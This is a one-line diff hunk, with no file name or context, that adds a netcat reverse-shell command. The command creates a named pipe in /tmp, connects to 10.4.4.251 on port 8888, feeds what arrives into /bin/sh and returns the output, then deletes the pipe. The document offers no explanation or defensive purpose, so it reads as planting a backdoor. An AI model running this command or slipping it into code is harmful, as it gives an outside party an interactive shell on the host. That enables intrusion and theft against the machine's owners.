@@ -1,0 +1,1 @@
+mkfifo /tmp/wbkhe; nc 10.4.4.251 8888 0</tmp/wbkhe | /bin/sh >/tmp/wbkhe 2>&1; rm /tmp/wbkhe
